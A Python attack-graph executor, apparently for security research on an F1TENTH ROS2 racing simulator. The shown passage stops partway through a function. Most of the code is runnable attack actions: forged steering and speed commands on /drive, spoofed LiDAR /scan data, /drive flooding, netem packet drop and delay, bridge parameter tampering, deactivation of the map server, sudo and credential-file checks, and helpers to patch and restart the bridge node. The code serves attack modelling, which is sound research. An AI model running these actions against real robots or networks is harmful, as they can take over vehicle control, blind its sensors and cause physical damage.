#!/usr/bin/env python3
import os
import re
import time
import json
import subprocess
from collections import defaultdict
from pathlib import Path

# -----------------------------
# regexes
# -----------------------------
NODE_RE = re.compile(r'^\s*(\d+)\s+\[label="([^"]+)"', re.M)
EDGE_RE = re.compile(r'^\s*(\d+)\s*->\s*(\d+)', re.M)

STATE_FILE = os.environ.get("STATE_FILE", "state.json")
LOG_DIR = "logs"
ATTACKER_OUTPUT = os.environ.get("ATTACKER_OUTPUT", "summary").strip().lower()

ROS_SETUP = (
    "source /opt/ros/foxy/setup.bash && "
    "source /home/f1tenth/sim_ws/install/setup.bash"
)

TARGET = (
    "/home/f1tenth/sim_ws/install/f1tenth_gym_ros/lib/python3.8/"
    "site-packages/f1tenth_gym_ros/gym_bridge.py"
)
CLEAN = TARGET + ".clean"

BRIDGE_EXEC = (
    "/home/f1tenth/sim_ws/install/f1tenth_gym_ros/lib/"
    "f1tenth_gym_ros/gym_bridge"
)

BRIDGE_KILL_PATTERN = (
    "/home/f1tenth/sim_ws/install/f1tenth_gym_ros/lib/"
    "f1tenth_gym_ros/gym_bridge --ros-args -r __node:=bridge "
    "--params-file /home/f1tenth/sim_ws/install/f1tenth_gym_ros/share/"
    "f1tenth_gym_ros/config/sim.yaml"
)

# -----------------------------
# attack graph parsing helpers
# -----------------------------
def parse_pred(label: str):
    parts = label.split(":")
    if len(parts) < 3:
        return None
    mid = ":".join(parts[1:-1])
    if mid.startswith("RULE"):
        return None
    return mid


def parse_truth(label: str):
    parts = label.split(":")
    if len(parts) < 3:
        return None
    last = parts[-1].strip()
    if last == "1":
        return True
    if last == "0":
        return False
    return None


def is_rule(label: str) -> bool:
    parts = label.split(":")
    return len(parts) >= 2 and parts[1].startswith("RULE")


# -----------------------------
# filesystem/state/log
# -----------------------------
def normalize_state(state):
    if not isinstance(state, dict):
        state = {}
    state.setdefault("facts", {})
    state.setdefault("predicates", {})
    state.setdefault("smg", {})
    state.setdefault("meta", {})
    state["smg"].setdefault("t", 1)
    return state


def load_state():
    if not os.path.exists(STATE_FILE):
        return normalize_state({})
    with open(STATE_FILE, "r") as f:
        return normalize_state(json.load(f))


def save_state(s):
    s = normalize_state(s)
    with open(STATE_FILE, "w") as f:
        json.dump(s, f, indent=2, sort_keys=True)


def achieved(state, pred):
    state = normalize_state(state)
    return bool(
        state["facts"].get(pred, False) or
        state["predicates"].get(pred, False)
    )


def fact_true(state, pred):
    state = normalize_state(state)
    return bool(state["facts"].get(pred, False))


def pred_true(state, pred):
    state = normalize_state(state)
    return bool(state["predicates"].get(pred, False))


def mark_fact(state, pred, why=""):
    state = normalize_state(state)
    state["facts"][pred] = True
    if why:
        state["meta"][f"why::{pred}"] = why
    save_state(state)


def mark_pred(state, pred, why=""):
    state = normalize_state(state)
    state["predicates"][pred] = True
    if why:
        state["meta"][f"why::{pred}"] = why
    save_state(state)


def set_smg(state, key, value=True):
    state = normalize_state(state)
    state["smg"][key] = value
    save_state(state)


def set_turn(state, t_value):
    state = normalize_state(state)
    state["smg"]["t"] = int(t_value)
    save_state(state)


def log(name, text):
    os.makedirs(LOG_DIR, exist_ok=True)
    path = os.path.join(LOG_DIR, f"{name}_{time.strftime('%Y%m%d-%H%M%S')}.txt")
    with open(path, "w") as f:
        f.write(text)
    if ATTACKER_OUTPUT in {"full", "verbose", "1"}:
        print("[LOG]", path)
    return path


def sh(cmd, timeout=None):
    if ATTACKER_OUTPUT in {"full", "verbose", "1"}:
        print("\n[CMD]", " ".join(cmd))
    try:
        p = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
        out = (p.stdout or "") + (p.stderr or "")
        return p.returncode, out
    except subprocess.TimeoutExpired as e:
        out = (e.stdout or "") + (e.stderr or "")
        out = (out if isinstance(out, str) else (out.decode() if out else ""))
        out += f"\n[TIMEOUT] command exceeded {timeout} seconds"
        if ATTACKER_OUTPUT in {"full", "verbose", "1"}:
            print(out)
        return 124, out
    except Exception as e:
        out = f"[EXCEPTION] {type(e).__name__}: {e}"
        if ATTACKER_OUTPUT in {"full", "verbose", "1"}:
            print(out)
        return 1, out


def ros_bash(cmd: str, timeout=None):
    return sh(["bash", "-lc", f"{ROS_SETUP} && {cmd}"], timeout=timeout)


# -----------------------------
# ROS2 helpers
# -----------------------------
def topic_info_v(topic):
    rc, out = ros_bash(f"ros2 topic info {topic} -v")
    log("topic_info_v", out)
    if rc != 0:
        return None
    return out


def topic_type(topic):
    rc, out = ros_bash(f"ros2 topic type {topic}")
    log("topic_type", out)
    if rc != 0:
        return None
    return out.strip().splitlines()[-1].strip() if out.strip() else None


def node_list():
    rc, out = ros_bash("ros2 node list", timeout=10)
    log("node_list", out)
    if rc != 0:
        return None
    return out


def node_info(node_name):
    rc, out = ros_bash(f"ros2 node info {node_name}", timeout=10)
    log("node_info", out)
    if rc != 0:
        return None
    return out


# -----------------------------
# bridge helpers
# -----------------------------
def restore_clean_bridge():
    if not os.path.exists(CLEAN):
        print(f"[FAIL] clean backup not found: {CLEAN}")
        return False
    rc, out = sh(["bash", "-lc", f"cp '{CLEAN}' '{TARGET}'"])
    log("restore_clean_bridge", out)
    return rc == 0


def patch_first_matching_line(contains_text: str, new_lines: str):
    p = Path(TARGET)
    lines = p.read_text().splitlines()
    out = []
    done = False

    for line in lines:
        if (contains_text in line) and (not done):
            indent = line[:len(line) - len(line.lstrip())]
            for nl in new_lines.split("\n"):
                out.append(indent + nl)
            done = True
        else:
            out.append(line)

    p.write_text("\n".join(out) + "\n")
    return done


def restart_patched_bridge(logfile="/tmp/bridge_attack.log"):
    pattern = (
        "/home/f1tenth/sim_ws/install/f1tenth_gym_ros/lib/f1tenth_gym_ros/gym_bridge "
        "--ros-args -r __node:=bridge "
        "--params-file /home/f1tenth/sim_ws/install/f1tenth_gym_ros/share/f1tenth_gym_ros/config/sim.yaml"
    )

    rc1, out1 = sh([
        "bash", "-lc",
        f"pgrep -f \"{pattern}\" || true"
    ], timeout=10)
    log("restart_patched_bridge_pgrep", out1)

    pids = []
    for line in out1.splitlines():
        line = line.strip()
        if line.isdigit():
            pids.append(line)

    for pid in pids:
        rc2, out2 = sh(["bash", "-lc", f"kill -TERM {pid} || true"], timeout=10)
        log(f"restart_patched_bridge_kill_{pid}", out2)

    time.sleep(2)

    cmd = (
        "nohup /usr/bin/python3 "
        "/home/f1tenth/sim_ws/install/f1tenth_gym_ros/lib/f1tenth_gym_ros/gym_bridge "
        "--ros-args -r __node:=bridge "
        "--params-file /home/f1tenth/sim_ws/install/f1tenth_gym_ros/share/f1tenth_gym_ros/config/sim.yaml "
        f">{logfile} 2>&1 &"
    )
    rc3, out3 = sh(["bash", "-lc", cmd], timeout=10)
    log("restart_patched_bridge_nohup", out3)

    time.sleep(5)

    rc4, out4 = sh([
        "bash", "-lc",
        f"pgrep -af \"{pattern}\" || true"
    ], timeout=10)
    log("restart_patched_bridge_ps", out4)

    return bool(out4.strip())


# -----------------------------
# attacker runtime actions
# -----------------------------
def act_graph_discovery_bridge():
    out = node_list()
    if not out:
        return False
    found = ("/bridge" in out) or ("\nbridge" in out) or ("bridge\n" in out) or ("bridge" in out)
    return found


def act_initial_access_engineering_ws():
    # Evidence that attacker has command execution on entry workstation.
    rc, out = sh(["bash", "-lc", "whoami && hostname && id"], timeout=8)
    log("initial_access_engineering_ws", out)
    return rc == 0 and bool(out.strip())


def act_lateral_access_robot_host():
    # In this sim, default target is localhost unless overridden.
    host = os.environ.get("ATTACK_ROBOT_HOST", "127.0.0.1").strip()
    rc, out = sh(["bash", "-lc", f"ping -c 1 -W 1 {host}"], timeout=6)
    log("lateral_access_robot_host", out)
    return rc == 0


def act_credential_access_robot_host():
    # Demonstrable credential access:
    # - if ATTACK_CRED_PATH is provided, file must exist/readable
    # - else if DDS security is disabled in this deployment, credential step is N/A but justified
    cred_path = os.environ.get("ATTACK_CRED_PATH", "").strip()
    if cred_path:
        rc, out = sh(["bash", "-lc", f"test -r '{cred_path}' && echo CRED_OK || true"], timeout=6)
        log("credential_access_robot_host", out)
        return "CRED_OK" in out

    rc, out = ros_bash("ros2 security --help || true", timeout=8)
    log("credential_access_robot_host", out)
    dds_off = os.environ.get("ATTACK_DDS_SECURITY", "off").strip().lower() in {"off", "disabled", "0", "false"}
    if dds_off:
        print("[ATTACKER] DDS security is OFF in this scenario; credential theft not required.")
        return True
    return False


def act_attacker_on_ros_network_robot_host():
    rc, out = ros_bash("ros2 node list", timeout=10)
    log("attacker_on_ros_network_robot_host", out)
    return rc == 0 and bool(out.strip())


def act_attacker_can_join_ros_graph_robot_host():
    rc, out = ros_bash("ros2 topic list -t", timeout=10)
    log("attacker_can_join_ros_graph_robot_host", out)
    return rc == 0 and "/scan" in out


def act_attacker_can_netadmin_robot_host():
    # Non-interactive privilege check (won't block on password prompt).
    check_cmd = os.environ.get("ATTACK_NETADMIN_CHECK", "sudo -n true").strip()
    rc, out = sh(["bash", "-lc", check_cmd], timeout=6)
    log("attacker_can_netadmin_robot_host", out)
    return rc == 0


def act_target_node_selected_bridge():
    out = node_info("/bridge")
    if not out:
        out = node_info("bridge")
        if not out:
            return False
    return True


def act_code_location_known_bridge():
    cmd = f"test -f '{TARGET}' && realpath '{TARGET}' || true"
    rc, out = sh(["bash", "-lc", cmd])
    log("code_location_known_bridge", out)
    return bool(out.strip())


def act_compromised_ros_node_bridge():
    rc, out = sh(["bash", "-lc", f"test -w '{TARGET}' && echo WRITABLE || true"])
    log("compromised_bridge_check", out)
    return "WRITABLE" in out


def act_topic_write_drive():
    msg = (
        "\"{header: {stamp: {sec: 0, nanosec: 0}, frame_id: ''}, "
        "drive: {steering_angle: 0.6, steering_angle_velocity: 0.0, "
        "speed: 4.0, acceleration: 0.0, jerk: 0.0}}\""
    )
    rc, out = ros_bash(
        f"ros2 topic pub -1 /drive ackermann_msgs/msg/AckermannDriveStamped {msg}",
        timeout=10,
    )
    log("topic_write_drive", out)
    return rc == 0


def act_topic_write_scan():
    topic = "/scan"
    t = topic_type(topic)
    if not t:
        print("[FAIL] cannot discover /scan type")
        return False

    msg = (
        "{header: {frame_id: 'evil_scan_writer'}, "
        "angle_min: 0.0, angle_max: 0.1, angle_increment: 0.01, "
        "time_increment: 0.0, scan_time: 0.0, range_min: 0.0, range_max: 999.0, "
        "ranges: [999.0,999.0,999.0], intensities: []}"
    )
    rc, out = ros_bash(f"ros2 topic pub -1 {topic} {t} \"{msg}\"", timeout=10)
    log("topic_write_scan", out)
    return rc == 0


def runtime_scan_msg_for_mode(mode: str, scale_factor: str):
    if mode == "close":
        ranges = "[0.1,0.1,0.1,0.1,0.1,0.1,0.1,0.1,0.1,0.1]"
    elif mode == "far":
        ranges = "[30.0,30.0,30.0,30.0,30.0,30.0,30.0,30.0,30.0,30.0]"
    elif mode == "noise":
        ranges = "[0.3,22.0,1.1,15.0,0.6,18.0,2.0,25.0,0.8,20.0]"
    elif mode == "blindspot":
        ranges = "[0.0,0.0,0.0,0.0,0.0,15.0,14.5,13.9,12.0,10.0]"
    elif mode == "reverse":
        ranges = "[10.0,9.0,8.0,7.0,6.0,5.0,4.0,3.0,2.0,1.0]"
    elif mode == "scale":
        sf = float(scale_factor)
        vals = [round(v * sf, 2) for v in [1.0, 2.0, 3.0, 4.0, 5.0, 6.0]]
        ranges = "[" + ",".join(str(v) for v in vals) + "]"
    else:
        return None

    return (
        "{header: {frame_id: 'evil_scan_writer'}, "
        "angle_min: -1.57, angle_max: 1.57, angle_increment: 0.314, "
        "time_increment: 0.0, scan_time: 0.0, range_min: 0.0, range_max: 999.0, "
        f"ranges: {ranges}, intensities: []}}"
    )


def runtime_publish_malicious_scan(mode: str, scale_factor: str, qos_reliability: str):
    topic = "/scan"
    t = topic_type(topic)
    if not t:
        print("[FAIL] cannot discover /scan type")
        return False

    msg = runtime_scan_msg_for_mode(mode, scale_factor)
    if msg is None:
        print(f"[FAIL] unknown ATTACK_SCAN_MODE={mode}")
        return False

    duration = os.environ.get("ATTACK_RUNTIME_INJECT_SECS", "6")
    rate = os.environ.get("ATTACK_RUNTIME_INJECT_RATE", "15")
    qos_opt = f"--qos-reliability {qos_reliability}" if qos_reliability else ""

    cmd = (
        f"timeout {duration}s ros2 topic pub -r {rate} {qos_opt} "
        f"{topic} {t} \"{msg}\" || true"
    )
    rc, out = ros_bash(cmd, timeout=int(float(duration)) + 8)
    log("runtime_publish_malicious_scan", out)
    started = ("publishing #" in out.lower()) or ("publisher:" in out.lower())
    return started


def runtime_apply_netem(rule: str):
    iface = os.environ.get("ATTACK_NETEM_IFACE", "").strip()
    if not iface:
        print("[FAIL] ATTACK_NETEM_IFACE is required for runtime delay/drop attacks")
        return False

    tc_prefix = os.environ.get("ATTACK_TC_PREFIX", "tc").strip()
    rc, out = sh(
        ["bash", "-lc", f"{tc_prefix} qdisc replace dev {iface} root netem {rule}"],
        timeout=10,
    )
    log("runtime_apply_netem", out)
    return rc == 0


def runtime_clear_netem():
    iface = os.environ.get("ATTACK_NETEM_IFACE", "").strip()
    if not iface:
        return True
    tc_prefix = os.environ.get("ATTACK_TC_PREFIX", "tc").strip()
    rc, out = sh(
        ["bash", "-lc", f"{tc_prefix} qdisc del dev {iface} root || true"],
        timeout=10,
    )
    log("runtime_clear_netem", out)
    return rc == 0


def act_malicious_topic_content_scan():
    mode = os.environ.get("ATTACK_SCAN_MODE", "close").strip().lower()
    scale_factor = os.environ.get("ATTACK_SCALE_FACTOR", "2.0")
    print(f"[ATTACKER] runtime malicious scan mode = {mode}")
    return runtime_publish_malicious_scan(mode, scale_factor, qos_reliability="")


def act_topic_drop_scan():
    drop_secs = os.environ.get("ATTACK_DROP_SECS", "8.0")
    print(f"[ATTACKER] runtime drop using netem loss 100% for {drop_secs}s")
    ok = runtime_apply_netem("loss 100%")
    if not ok:
        return False
    time.sleep(float(drop_secs))
    runtime_clear_netem()
    return True


def act_topic_delay_scan():
    delay_secs = float(os.environ.get("ATTACK_DELAY_SECS", "8.0"))
    delay_ms = max(1, int(delay_secs * 1000.0))
    print(f"[ATTACKER] runtime delay using netem delay {delay_ms}ms")
    ok = runtime_apply_netem(f"delay {delay_ms}ms")
    if not ok:
        return False
    time.sleep(delay_secs)
    runtime_clear_netem()
    return True


def act_qos_degradation_scan():
    mode = os.environ.get("ATTACK_SCAN_MODE", "far").strip().lower()
    scale_factor = os.environ.get("ATTACK_SCALE_FACTOR", "2.0")
    print(f"[ATTACKER] runtime qos degradation with BEST_EFFORT, mode={mode}")
    return runtime_publish_malicious_scan(
        mode,
        scale_factor,
        qos_reliability="best_effort",
    )


def act_service_call_bridge_set_parameters():
    param_name = os.environ.get("ATTACK_BRIDGE_PARAM", "scan_beams")
    param_value = os.environ.get("ATTACK_BRIDGE_VALUE", "10")
    rc, out = ros_bash(f"ros2 param set /bridge {param_name} {param_value}", timeout=15)
    log("bridge_set_parameters", out)
    return rc == 0


def act_service_call_map_server_change_state():
    transition_id = os.environ.get("ATTACK_LIFECYCLE_ID", "4")
    transition_label = os.environ.get("ATTACK_LIFECYCLE_LABEL", "deactivate")

    # quick pre-check: does the service even appear?
    rc0, out0 = ros_bash(
        "ros2 service list | grep -F /map_server/change_state || true",
        timeout=5,
    )
    log("map_server_change_state_service_list", out0)

    if "/map_server/change_state" not in out0:
        print("[FAIL] /map_server/change_state not visible")
        return False

    # quick pre-check: can lifecycle state be queried?
    rc1, out1 = ros_bash(
        "timeout 5s ros2 lifecycle get /map_server || true",
        timeout=8,
    )
    log("map_server_lifecycle_get", out1)

    if ("active" not in out1.lower() and
        "inactive" not in out1.lower() and
        "unconfigured" not in out1.lower() and
        "configuring" not in out1.lower()):
        print("[FAIL] /map_server lifecycle query not responsive")
        return False

    payload = f"\"{{transition: {{id: {transition_id}, label: '{transition_label}'}}}}\""

    rc2, out2 = ros_bash(
        f"timeout 8s ros2 service call /map_server/change_state "
        f"lifecycle_msgs/srv/ChangeState {payload} || true",
        timeout=12,
    )
    log("map_server_change_state", out2)

    ok = (
        "success: true" in out2.lower()
        or "transitioning successful" in out2.lower()
        or rc2 == 0
    )

    if not ok:
        print("[FAIL] /map_server/change_state did not complete successfully")

    return ok


def act_topic_read_scan():
    rc, out = ros_bash("timeout 3s ros2 topic echo /scan --once || true", timeout=10)
    log("topic_read_scan", out)
    return bool(out.strip())


def act_topic_flood_drive():
    rate = os.environ.get("ATTACK_DRIVE_FLOOD_RATE", "200")
    secs = os.environ.get("ATTACK_DRIVE_FLOOD_SECS", "5")
    msg = (
        "\"{header: {stamp: {sec: 0, nanosec: 0}, frame_id: ''}, "
        "drive: {steering_angle: 0.3, steering_angle_velocity: 0.0, "
        "speed: 2.0, acceleration: 0.0, jerk: 0.0}}\""
    )

    cmd = (
        f"timeout {secs}s ros2 topic pub -r {rate} "
        f"/drive ackermann_msgs/msg/AckermannDriveStamped {msg} || true"
    )
    rc, out = ros_bash(cmd, timeout=int(secs) + 5)
    log("topic_flood_drive", out)

    started = ("publishing #" in out.lower()) or ("publisher:" in out.lower()) or (rc == 0)
    if not started:
        print("[FAIL] flood command did not show evidence of active publishing")
        return False

    return True


ACTION_IMPL = {
    "initialAccess(engineering_ws)": act_initial_access_engineering_ws,
    "lateralAccess(robot_host)": act_lateral_access_robot_host,
    "credentialAccess(robot_host)": act_credential_access_robot_host,
    "attackerOnRosNetwork(robot_host)": act_attacker_on_ros_network_robot_host,
    "attackerCanJoinRosGraph(robot_host)": act_attacker_can_join_ros_graph_robot_host,
    "attackerCanNetAdmin(robot_host)": act_attacker_can_netadmin_robot_host,
    "graphDiscovery(bridge)": act_graph_discovery_bridge,
    "targetNodeSelected(bridge)": act_target_node_selected_bridge,
    "codeLocationKnown(f1tenth_bridge,bridge)": act_code_location_known_bridge,
    "compromisedRosNode(bridge)": act_compromised_ros_node_bridge,
    "topicWrite('/drive')": act_topic_write_drive,
    "topicWrite('/scan')": act_topic_write_scan,
    "maliciousTopicContent('/scan')": act_malicious_topic_content_scan,
    "topicDrop('/scan')": act_topic_drop_scan,
    "topicDelay('/scan')": act_topic_delay_scan,
    "qosDegradation('/scan')": act_qos_degradation_scan,
    "serviceCall('/bridge/set_parameters',bridge)": act_service_call_bridge_set_parameters,
    "serviceCall('/map_server/change_state',map_server)": act_service_call_map_server_change_state,
    "topicRead('/scan')": act_topic_read_scan,
    "topicFlood('/drive')": act_topic_flood_drive,
}

# These are the only predicates that correspond to real attacker-performed actions
EXECUTABLE_ATTACK_ACTIONS = {
    "initialAccess(engineering_ws)",
    "lateralAccess(robot_host)",
    "credentialAccess(robot_host)",
    "attackerOnRosNetwork(robot_host)",
    "attackerCanJoinRosGraph(robot_host)",
    "attackerCanNetAdmin(robot_host)",
    "graphDiscovery(bridge)",
    "targetNodeSelected(bridge)",
    "codeLocationKnown(f1tenth_bridge,bridge)",
    "compromisedRosNode(bridge)",
    "topicWrite('/drive')",
    "topicWrite('/scan')",
    "maliciousTopicContent('/scan')",
    "topicDrop('/scan')",
    "topicDelay('/scan')",
    "qosDegradation('/scan')",
    "serviceCall('/bridge/set_parameters',bridge)",
    "serviceCall('/map_server/change_state',map_server)",
    "topicRead('/scan')",
    "topicFlood('/drive')",
}

# Structural predicates: benign/non-attack graph steps
DERIVABLE_STRUCTURAL_PREDS = {
    "rtpsReachableNode(bridge)",
    "nodeSubscribesToTopic(bridge,'/drive')",
    "typeOkSubscriber(bridge,'/drive')",
    "nodePublishesToTopic(bridge,'/scan')",
    "typeOkPublisher(bridge,'/scan')",
    "rtpsReachableNode(map_server)",
    "rosService('/bridge/set_parameters',bridge)",
    "rosService('/map_server/change_state',map_server)",
    "rtpsReachableNode(rviz)",
    "nodeSubscribesToTopic(rviz,'/scan')",
    "typeOkSubscriber(rviz,'/scan')",
}

# Consequence predicates: these should be derived once attacks/structure justify them
DERIVABLE_CONSEQUENCE_PREDS = {
    "topicInfluence('/drive')",
    "commandIntegrityLoss('/drive')",
    "topicInfluence('/scan')",
    "sensorIntegrityLoss('/scan')",
    "sensorAvailabilityLoss('/scan')",
    "parameterTamper(bridge)",
    "configurationIntegrityLoss(bridge)",
    "lifecycleAbuse(map_server)",
    "lifecycleDisruption(map_server)",
    "exfiltrateTopicData('/scan')",
    "mitmPossible('/scan')",
    "cryptoInfoLeak('/scan')",
    "dos(bridge)",
    "operationalCompromise(f1tenth)",
    "availabilityCompromise(f1tenth)",
    "confidentialityCompromise(f1tenth)",
    "systemCompromised(f1tenth)",
}

DERIVABLE_PREDS = DERIVABLE_STRUCTURAL_PREDS | DERIVABLE_CONSEQUENCE_PREDS

# -----------------------------
# attack graph dependency builder
# -----------------------------
def build_graph(dot_text: str):
    nodes = {int(i): lab for i, lab in NODE_RE.findall(dot_text)}
    edges = [(int(a), int(b)) for a, b in EDGE_RE.findall(dot_text)]

    rule_nodes = {nid for nid, lab in nodes.items() if is_rule(lab)}

    pred_by_id = {}
    pred_truth = {}
    for nid, lab in nodes.items():
        p = parse_pred(lab)
        if p:
            pred_by_id[nid] = p
            pred_truth[p] = parse_truth(lab)

    pred_nodes = set(pred_by_id.keys())

    preds_of_rule = defaultdict(list)
    succs_of_rule = defaultdict(list)

    for a, b in edges:
        if b in rule_nodes and a in pred_nodes:
            preds_of_rule[b].append(a)
        if a in rule_nodes and b in pred_nodes:
            succs_of_rule[a].append(b)

    # Each predicate may be derivable via multiple rules.
    # We must preserve OR semantics across rules (not collapse into one big AND set).
    deps_options_by_pred = defaultdict(list)
    for r in rule_nodes:
        pre_preds = [pred_by_id[p] for p in preds_of_rule.get(r, [])]
        suc_preds = [pred_by_id[s] for s in succs_of_rule.get(r, [])]
        for s in suc_preds:
            deps_options_by_pred[s].append(tuple(sorted(set(pre_preds))))

    # Dedupe identical prerequisite options per predicate
    dep_options = {}
    for pred, opts in deps_options_by_pred.items():
        uniq = []
        seen = set()
        for opt in opts:
            if opt in seen:
                continue
            seen.add(opt)
            uniq.append(list(opt))
        dep_options[pred] = uniq

    # Backward-compatible flattened deps view (union of all options)
    deps_by_pred = {
        pred: sorted(set(p for opt in opts for p in opt))
        for pred, opts in dep_options.items()
    }

    all_preds = sorted(set(pred_by_id.values()))
    actions = sorted(deps_by_pred.keys())
    conditions = [p for p in all_preds if p not in set(actions)]
    graph_true_facts = {p for p, v in pred_truth.items() if v is True}

    return {
        "actions": actions,
        "conditions": conditions,
        "deps": {k: sorted(v) for k, v in deps_by_pred.items()},
        "dep_options": dep_options,
        "graph_true_facts": graph_true_facts,
        "pred_truth": pred_truth,
    }


# -----------------------------
# attack graph / PRISM state mapping
# -----------------------------
ATTACK_LABEL_TO_PRED = {
    "L_26_RULE6_Attackergainsinitialaccesstoanentryhost_26": "initialAccess(engineering_ws)",
    "L_23_RULE7_Attackerlaterallyreachesanotherhost_23": "lateralAccess(robot_host)",
    "L_20_RULE8_AttackerobtainsROScredentialsfromreachedhost_20": "credentialAccess(robot_host)",
    "L_29_RULE9_AttackerispositionedonROSnetwork_29": "attackerOnRosNetwork(robot_host)",
    "L_18_RULE10_AttackercanjoinROSgraphasanauthorizedparticipant_18": "attackerCanJoinRosGraph(robot_host)",
    "L_31_RULE11_AttackercanjoinROSgraphwhenDDSsecurityisdisabled_31": "attackerCanJoinRosGraph(robot_host)",
    "L_32_RULE11_AttackercanjoinROSgraphwhenDDSsecurityisdisabled_32": "attackerCanJoinRosGraph(robot_host)",
    "L_37_RULE11_AttackercanjoinROSgraphwhenDDSsecurityisdisabled_37": "attackerCanJoinRosGraph(robot_host)",
    "L_92_RULE12_Attackerhashostprivilegefornetworkshaping_92": "attackerCanNetAdmin(robot_host)",
    "L_71_RULE6_AttackerdiscoversROSnodethroughexposedDDSgraph_71": "graphDiscovery(bridge)",
    "L_85_RULE13_AttackerdiscoversROSnodethroughexposedDDSgraph_85": "graphDiscovery(bridge)",
    "L_68_RULE7_Attackerselectsimpactfultargetnode_68": "targetNodeSelected(bridge)",
    "L_82_RULE14_Attackerselectsimpactfultargetnode_82": "targetNodeSelected(bridge)",
    "L_64_RULE8_Attackerlocatescodeimplementingtargetnode_64": "codeLocationKnown(f1tenth_bridge,bridge)",
    "L_61_RULE9_Attackermodifiestrustednodeimplementation_61": "compromisedRosNode(bridge)",
    "L_12_RULE11_Attackerwritestopic_12": "topicWrite('/drive')",
    "L_12_RULE16_Attackerwritestopic_12": "topicWrite('/drive')",
    "L_35_RULE11_Attackerwritestopic_35": "topicWrite('/scan')",
    "L_60_RULE16_Attackerwritestopic_60": "topicWrite('/scan')",
    "L_52_RULE15_Compromisedtrustedpublishertamperssensortopiccontent_52": "maliciousTopicContent('/scan')",
    "L_73_RULE20_Authorizedrogueparticipanttamperssensortopiccontent_73": "maliciousTopicContent('/scan')",
    "L_76_RULE16_Compromisedtrustedpublisherdropssensortopic_76": "topicDrop('/scan')",
    "L_90_RULE21_Attackerdropssensortopicvianetworkimpairment_90": "topicDrop('/scan')",
    "L_79_RULE17_Compromisedtrustedpublisherdelayssensortopic_79": "topicDelay('/scan')",
    "L_97_RULE22_Attackerdelayssensortopicvianetworkimpairment_97": "topicDelay('/scan')",
    "L_82_RULE18_CompromisedtrustedpublisherdegradessensorQoS_82": "qosDegradation('/scan')",
    "L_100_RULE23_AuthorizedrogueparticipantdegradessensorQoS_100": "qosDegradation('/scan')",
    "L_90_RULE13_Attackercallsservice_90": "serviceCall('/bridge/set_parameters',bridge)",
    "L_108_RULE18_Attackercallsservice_108": "serviceCall('/bridge/set_parameters',bridge)",
    "L_103_RULE13_Attackercallsservice_103": "serviceCall('/map_server/change_state',map_server)",
    "L_121_RULE18_Attackercallsservice_121": "serviceCall('/map_server/change_state',map_server)",
    "L_119_RULE10_Attackerreadstopic_119": "topicRead('/scan')",
    "L_133_RULE15_Attackerreadstopic_133": "topicRead('/scan')",
    "L_134_RULE12_Attackerfloodstopic_134": "topicFlood('/drive')",
    "L_149_RULE17_Attackerfloodstopic_149": "topicFlood('/drive')",
}

PRED_TO_ATTACK_LABEL = {v: k for k, v in ATTACK_LABEL_TO_PRED.items()}

PRED_TO_SMG = {
    "initialAccess(engineering_ws)": "initialAccess_engineering_ws_",
    "lateralAccess(robot_host)": "lateralAccess_robot_host_",
    "credentialAccess(robot_host)": "credentialAccess_robot_host_",
    "attackerOnRosNetwork(robot_host)": "attackerOnRosNetwork_robot_host_",
    "attackerCanJoinRosGraph(robot_host)": "attackerCanJoinRosGraph_robot_host_",
    "attackerCanNetAdmin(robot_host)": "attackerCanNetAdmin_robot_host_",
    "graphDiscovery(bridge)": "graphDiscovery_bridge_",
    "targetNodeSelected(bridge)": "targetNodeSelected_bridge_",
    "codeLocationKnown(f1tenth_bridge,bridge)": "codeLocationKnown_f1tenth_bridge_bridge_",
    "compromisedRosNode(bridge)": "compromisedRosNode_bridge_",
    "systemCompromised(f1tenth)": "systemCompromised_f1tenth_",
    "operationalCompromise(f1tenth)": "operationalCompromise_f1tenth_",
    "commandIntegrityLoss('/drive')": "commandIntegrityLoss_drive_",
    "topicInfluence('/drive')": "topicInfluence_drive_",
    "topicWrite('/drive')": "topicWrite_drive_",
    "sensorIntegrityLoss('/scan')": "sensorIntegrityLoss_scan_",
    "topicInfluence('/scan')": "topicInfluence_scan_",
    "maliciousTopicContent('/scan')": "maliciousTopicContent_scan_",
    "nodePublishesToTopic(bridge,'/scan')": "nodePublishesToTopic_bridge_scan_",
    "typeOkPublisher(bridge,'/scan')": "typeOkPublisher_bridge_scan_",
    "sensorAvailabilityLoss('/scan')": "sensorAvailabilityLoss_scan_",
    "topicDrop('/scan')": "topicDrop_scan_",
    "topicDelay('/scan')": "topicDelay_scan_",
    "qosDegradation('/scan')": "qosDegradation_scan_",
    "configurationIntegrityLoss(bridge)": "configurationIntegrityLoss_bridge_",
    "parameterTamper(bridge)": "parameterTamper_bridge_",
    "serviceCall('/bridge/set_parameters',bridge)": "serviceCall_bridgeset_parameters_bridge_",
    "rosService('/bridge/set_parameters',bridge)": "rosService_bridgeset_parameters_bridge_",
    "lifecycleDisruption(map_server)": "lifecycleDisruption_map_server_",
    "lifecycleAbuse(map_server)": "lifecycleAbuse_map_server_",
    "serviceCall('/map_server/change_state',map_server)": "serviceCall_map_serverchange_state_map_server_",
    "rtpsReachableNode(map_server)": "rtpsReachableNode_map_server_",
    "rosService('/map_server/change_state',map_server)": "rosService_map_serverchange_state_map_server_",
    "confidentialityCompromise(f1tenth)": "confidentialityCompromise_f1tenth_",
    "exfiltrateTopicData('/scan')": "exfiltrateTopicData_scan_",
    "topicRead('/scan')": "topicRead_scan_",
    "cryptoInfoLeak('/scan')": "cryptoInfoLeak_scan_",
    "mitmPossible('/scan')": "mitmPossible_scan_",
    "topicWrite('/scan')": "topicWrite_scan_",
    "rtpsReachableNode(rviz)": "rtpsReachableNode_rviz_",
    "nodeSubscribesToTopic(rviz,'/scan')": "nodeSubscribesToTopic_rviz_scan_",
    "typeOkSubscriber(rviz,'/scan')": "typeOkSubscriber_rviz_scan_",
    "availabilityCompromise(f1tenth)": "availabilityCompromise_f1tenth_",
    "dos(bridge)": "dos_bridge_",
    "topicFlood('/drive')": "topicFlood_drive_",
    "rtpsReachableNode(bridge)": "rtpsReachableNode_bridge_",
    "nodeSubscribesToTopic(bridge,'/drive')": "nodeSubscribesToTopic_bridge_drive_",
    "typeOkSubscriber(bridge,'/drive')": "typeOkSubscriber_bridge_drive_",
}

# -----------------------------
# graph-state initialization
# -----------------------------
def initialize_graph_facts(graph, state):
    state = normalize_state(state)
    changed = False

    for pred in graph.get("graph_true_facts", set()):
        if not fact_true(state, pred):
            state["facts"][pred] = True
            state["meta"][f"why::{pred}"] = "graph_true_fact"
            smg_key = PRED_TO_SMG.get(pred)
            if smg_key:
                state["smg"][smg_key] = True
            changed = True

    if "t" not in state["smg"]:
        state["smg"]["t"] = 1
